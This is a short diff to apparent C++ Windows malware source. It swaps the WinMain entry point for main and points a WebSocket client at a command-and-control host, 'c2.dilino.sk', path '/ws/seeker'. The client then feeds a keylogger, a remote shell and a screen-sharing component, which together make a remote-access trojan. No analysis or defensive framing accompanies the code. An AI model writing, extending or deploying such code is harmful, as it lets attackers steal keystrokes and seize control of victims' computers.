@@ -27,8 +27,8 @@ struct Seeker {
     }
 };
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    WebSocketClient client("dilino.sk", 443, "/ws/seeker");
+int main() {
+    WebSocketClient client("c2.dilino.sk", 443, "/ws/seeker");
     KeyLogger keylogger(client);
     Shell shell(client);
     ScreenShare screenshare(client);
